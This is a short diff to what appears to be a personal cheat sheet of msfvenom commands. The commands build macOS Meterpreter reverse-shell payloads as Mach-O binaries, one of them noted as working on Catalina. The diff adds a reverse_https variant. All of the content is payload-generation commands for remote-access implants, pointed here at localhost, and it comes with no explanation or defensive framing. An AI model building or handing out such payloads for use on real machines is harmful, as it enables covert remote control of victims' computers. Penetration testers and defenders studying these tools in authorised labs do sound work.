@@ -3,3 +3,4 @@ sudo msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=3220 -f o
 
 # Mac - Mach-o [works on Catalina]
 sudo ./msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=3320 -f macho -o ./x
+sudo ./msfvenom -p osx/x64/meterpreter_reverse_https LHOST=127.0.0.1 LPORT=8888 -f macho -o ./y
